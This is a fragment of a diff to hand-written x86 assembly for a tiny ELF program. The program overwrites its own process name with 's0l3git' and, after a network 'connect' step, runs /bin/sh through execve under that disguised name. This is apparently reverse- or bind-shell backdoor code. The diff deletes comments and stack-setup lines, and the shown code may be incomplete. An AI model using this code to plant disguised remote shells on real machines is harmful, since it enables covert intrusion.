@@ -32,8 +32,6 @@ e_type:
             dd      1                               ;   e_version
             dd      _start                          ;   e_entry
             dd      phdr - $$                       ;   e_phoff
-            
-; These are 5 bytes, in place of e_shoff and e_flags (each 4 bytes)
 NEW_ARGV:
             db      "s0l3git", 0   ; e_shoff, e_flags
             
@@ -68,7 +66,6 @@ _name:
     xchg ecx, edi   ; edi = &argv[0], ecx = strlen()
     
     ; fill argv[0] with zeroes. AX == 0
-    mov edi, [esp]
     rep stosb 
     
     ; strncpy(&argv[0], NEW_ARGV, strlen(argv[0] + 1))
@@ -219,7 +216,7 @@ connect:
 
   	; 4 - execve /bin/sh
     ; execve(const char *filename, char *const argv[filename], char *const envp[])
-    ; execve(/bin//sh, &/bin//sh, 0)
+    ; execve(/bin/sh, &/bin/sh, 0)
 
 	; eax = 0xb = execve()
     ; ebx = *filename
@@ -228,9 +225,6 @@ connect:
 execve_sh:
 	; eax == 0  since it was test'ed before jumping here
     mov ebx, BIN_SH                 ; ebx =  ptr to "/bin/sh" into ebx
-    push edx                        ; edx = 0x00000000
-	mov edx, esp                    ; edx = ptr to NULL address
-	push ebx                        ; pointer to /bin/sh. Stack = 0X00, /bin/sh, 0X00000000, &/bin/sh
 	push eax                        ; == 0
 	push NEW_ARGV
     mov ecx, esp                    ; ecx points to shell's argv[0] ( &NEW_ARGV )
